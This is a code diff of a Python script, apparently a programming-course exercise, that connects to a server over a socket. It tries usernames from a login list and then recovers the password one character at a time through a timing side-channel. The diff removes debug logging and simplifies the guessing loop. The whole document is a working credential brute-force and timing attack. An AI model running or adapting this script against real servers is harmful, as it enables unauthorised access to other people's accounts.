@@ -36,10 +36,7 @@ import json
 import socket
 import sys
 import time
-import logging
 
-
-logging.basicConfig(filename=r'.\hacking\example.log', level=logging.DEBUG)
 
 letters = ['a', 'b', 'c', 'd', 'e', 'f', 'g',
            'h', 'i', 'j', 'k', 'l', 'm', 'n',
@@ -55,7 +52,6 @@ letters = ['a', 'b', 'c', 'd', 'e', 'f', 'g',
 with open(r'.\hacking\logins.txt', 'r') as file:
     logins_list = file.read().split()
 
-t = []
 host_name, port = sys.argv[1:]
 with socket.socket() as client_socket:
     client_socket.connect((host_name, int(port)))
@@ -74,33 +70,17 @@ with socket.socket() as client_socket:
             login = word.rstrip()
             break
 
-    logging.error('login %s', login)
-    e = True
-    for i in range(30):
-        if e is False:
-            break
-        j = 0
+    while True:
         for letter in letters:
             json_send = json.dumps({"login": login, "password": password + letter})
             client_socket.send(json_send.encode())
             old_time = time.time()
             response = client_socket.recv(1024).decode()
             new_time = time.time()
-            logging.error('*' * 40)
-            logging.error('response %s', response)
-            logging.error('i %s, j %s', i, j)
-            logging.error('old_time = %f, new_time = %f, time = %f', old_time, new_time, new_time - old_time)
-            t.append(new_time - old_time)
             if new_time - old_time > 0.09:
                 password += letter
-                logging.error('i %s, j %s', i, j)
-                logging.error('password %s, letter %s', password, letter)
                 break
             if response == connection_success:
                 password += letter
-                logging.error('Finished "login": %s, "password": %s', login, password)
                 print(json.dumps({"login": login, "password": password}))
-                e = False
-                break
-            j += 1
-# print(t)
+                exit()
